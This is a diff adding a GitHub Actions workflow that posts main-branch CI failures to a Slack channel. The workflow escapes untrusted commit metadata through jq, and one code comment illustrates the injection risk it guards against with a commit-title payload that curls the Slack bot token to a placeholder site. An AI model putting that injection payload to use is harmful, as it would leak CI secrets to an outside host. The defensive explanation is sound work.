@@ -1,0 +1,181 @@
+name: Notify Slack on main-branch workflow failure
+
+# Fires when a watched operational workflow completes with a failing
+# conclusion for the default branch (or an allowlisted release tag). Posts a
+# structured message to `#ci-failures` via Slack's `chat.postMessage`, so
+# silent post-merge breakage is caught without anyone watching the Actions tab.
+#
+# Relationship to `.github/workflows/ci-failure-notifier.yml`: that workflow
+# owns the managed GitHub issue lifecycle (open, update, close after recovery)
+# and remains the durable record. This workflow only pushes a notification and
+# duplicates none of that logic — it links to the run and to the managed issue
+# search. Both watch the same static workflow allowlist; `pnpm
+# quality:budgets:test` asserts the two lists stay identical.
+#
+# The bot token is the org-shared `secrets.SLACK_BOT_TOKEN`. It needs Slack's
+# `chat:write.public` scope so the bot can post to a public channel it has not
+# been invited to.
+#
+# Trigger discipline:
+#   - `workflow_run` requires the watched workflows to be named explicitly
+#     here; `workflow_run.workflows` does NOT support wildcards. Keep this list
+#     byte-identical to the `ci-failure-notifier.yml` allowlist.
+#   - The `if:` gate mirrors the issue notifier's admission rules and then
+#     narrows to failing conclusions: default-branch `push`, `schedule`, and
+#     `workflow_dispatch` runs, the allowlisted release-tag `push` workflow,
+#     and the repository-owned `Vercel Main Deployment` `workflow_run`.
+#   - `workflow_dispatch` (no inputs — checkov CKV_GHA_7 forbids them) lets you
+#     smoke-test the wiring by posting a fixed "🧪 wiring test" message.
+#     `workflow_dispatch` only offers the default branch, so the smoke test can
+#     only be run after this file has merged to `main`.
+#
+# This workflow never checks out or executes the triggering head SHA. It reads
+# `workflow_run` metadata into env and posts to Slack.
+on:
+  workflow_run:
+    workflows:
+      - CI/CD
+      - E2E (Connected Wallet)
+      - Publish UI Package
+      - Quality Budgets
+      - Scorecard supply-chain security
+      - Supply Chain
+      - Vercel Main Deployment
+      - Visual Regression
+    types: [completed]
+  workflow_dispatch:
+
+permissions: {}
+
+jobs:
+  notify:
+    name: post failure to Slack
+    # Test-fire path: `workflow_dispatch` always posts (no failure gate).
+    # Real path: post only for a watched workflow's admitted failing run.
+    # Catch every silent-failure conclusion, not just plain `failure`:
+    #   - failure          -> a step exited non-zero
+    #   - timed_out        -> the runner exceeded the job timeout
+    #   - startup_failure  -> the runner could not start the job
+    # Skip `cancelled` (usually a manual operator action) and `success`,
+    # `neutral`, `skipped`, and `action_required` (not failures).
+    if: >-
+      github.event_name == 'workflow_dispatch' ||
+      (
+        contains(fromJSON('["failure", "startup_failure", "timed_out"]'), github.event.workflow_run.conclusion) &&
+        (
+          github.event.workflow_run.event == 'schedule' ||
+          (
+            github.event.workflow_run.event == 'push' &&
+            (
+              github.event.workflow_run.head_branch == github.event.repository.default_branch ||
+              github.event.workflow_run.name == 'Publish UI Package'
+            )
+          ) ||
+          (
+            github.event.workflow_run.event == 'workflow_dispatch' &&
+            github.event.workflow_run.head_branch == github.event.repository.default_branch
+          ) ||
+          (
+            github.event.workflow_run.event == 'workflow_run' &&
+            github.event.workflow_run.name == 'Vercel Main Deployment' &&
+            github.event.workflow_run.head_branch == github.event.repository.default_branch &&
+            github.event.workflow_run.head_repository.full_name == github.repository
+          )
+        )
+      )
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    permissions: {}
+    steps:
+      - name: Post to the ci-failures channel
+        env:
+          SLACK_BOT_TOKEN: ${{ secrets.SLACK_BOT_TOKEN }}
+          IS_TEST: ${{ github.event_name == 'workflow_dispatch' }}
+          REPOSITORY: ${{ github.repository }}
+          # `workflow_run` context (only populated for real failures).
+          # IMPORTANT: never interpolate any of these into a shell command —
+          # a commit message can contain backticks or $(…) and would execute
+          # against the runner. Pass them to jq via --arg below, which escapes
+          # them safely.
+          WORKFLOW_NAME: ${{ github.event.workflow_run.name }}
+          RUN_URL: ${{ github.event.workflow_run.html_url }}
+          COMMIT_SHA: ${{ github.event.workflow_run.head_sha }}
+          COMMIT_MSG: ${{ github.event.workflow_run.display_title }}
+          ACTOR: ${{ github.event.workflow_run.triggering_actor.login }}
+          EVENT: ${{ github.event.workflow_run.event }}
+          CONCLUSION: ${{ github.event.workflow_run.conclusion }}
+          TARGET_REF: ${{ github.event.workflow_run.head_branch }}
+        run: |
+          set -euo pipefail
+
+          # Build the whole Slack payload in one jq invocation. Every
+          # untrusted string (commit message, actor login, URL, ref) flows
+          # through --arg, so jq JSON-escapes it instead of the shell
+          # interpolating it. This closes a token-exfiltration vector: a
+          # commit titled `$(curl bad-site/?$SLACK_BOT_TOKEN)` would otherwise
+          # be executed by the shell before the API call.
+          #
+          # jq's string interpolation also handles newlines correctly — "\n"
+          # inside a jq string literal is a real newline, so Slack's mrkdwn
+          # renders multi-line blocks instead of literal "\n" text.
+          if [ "$IS_TEST" = "true" ]; then
+            PAYLOAD=$(jq -nc \
+              --arg ch '#ci-failures' \
+              --arg repo "$REPOSITORY" \
+              '{
+                channel: $ch,
+                text: "🧪 *Notify-Slack wiring test*",
+                blocks: [
+                  {type: "section", text: {type: "mrkdwn", text: "🧪 *Notify-Slack wiring test*"}},
+                  {type: "section", text: {type: "mrkdwn", text: ("If you can read this, the listener workflow in `" + $repo + "`, the #ci-failures channel, and the bot scopes are all wired correctly. Safe to ignore.")}}
+                ]
+              }')
+          else
+            # Escape the commit title for Slack mrkdwn before insertion. A
+            # merged commit titled `<!channel>` or `<@U123ABC>` would
+            # otherwise render as a real mass-page mention inside the message.
+            # Per Slack's mrkdwn escaping rules
+            # (https://api.slack.com/reference/surfaces/formatting#escaping)
+            # the three control characters are `&`, `<`, and `>` — escape `&`
+            # first or the later substitutions corrupt their own output. The
+            # workflow name, ref, and actor login are GitHub-managed and
+            # cannot contain mention syntax.
+            PAYLOAD=$(jq -nc \
+              --arg ch '#ci-failures' \
+              --arg repo "$REPOSITORY" \
+              --arg wf "$WORKFLOW_NAME" \
+              --arg url "$RUN_URL" \
+              --arg sha "${COMMIT_SHA:0:7}" \
+              --arg msg "$COMMIT_MSG" \
+              --arg actor "$ACTOR" \
+              --arg event "$EVENT" \
+              --arg conclusion "$CONCLUSION" \
+              --arg ref "$TARGET_REF" \
+              '($msg | gsub("&"; "&amp;") | gsub("<"; "&lt;") | gsub(">"; "&gt;")) as $safe_msg
+               | (if $actor != "" and $actor != "null" then "\n*Triggered by:* " + $actor + " (`" + $event + "`)" else "\n*Triggered by:* `" + $event + "`" end) as $actor_line
+               | ("https://github.com/" + $repo + "/issues?q=" + ("is:issue is:open in:title CI: " + $wf + " is failing" | @uri)) as $issue_url
+               | {
+                channel: $ch,
+                text: ("❌ " + $wf + " " + $conclusion + " on " + $ref + " (" + $sha + ")"),
+                blocks: [
+                  {type: "section", text: {type: "mrkdwn", text: ("❌ *<" + $url + "|" + $wf + ">* concluded `" + $conclusion + "` on `" + $ref + "`")}},
+                  {type: "section", text: {type: "mrkdwn", text: ("*Commit:* `" + $sha + "` — " + $safe_msg + $actor_line + "\n\n<" + $url + "|View failed run →>  ·  <" + $issue_url + "|Managed failure issue →>")}},
+                  {type: "context", elements: [{type: "mrkdwn", text: "The CI Failure Notifier tracks this in a managed GitHub issue and closes it after recovery."}]}
+                ]
+              }')
+          fi
+
+          RESPONSE=$(curl -fsS -X POST https://slack.com/api/chat.postMessage \
+            -H "Authorization: Bearer $SLACK_BOT_TOKEN" \
+            -H "Content-Type: application/json; charset=utf-8" \
+            --data "$PAYLOAD")
+
+          # Slack answers 200 OK with {"ok": false, "error": "..."} on logical
+          # errors. Fail loudly when ok is not true, so this notifier does not
+          # go silently broken, which would defeat its purpose.
+          if [ "$(echo "$RESPONSE" | jq -r '.ok')" != "true" ]; then
+            echo "::error::Slack post failed: $(echo "$RESPONSE" | jq -r '.error // "unknown"')"
+            echo "Full response: $RESPONSE"
+            exit 1
+          fi
+          echo "Posted to #ci-failures successfully."
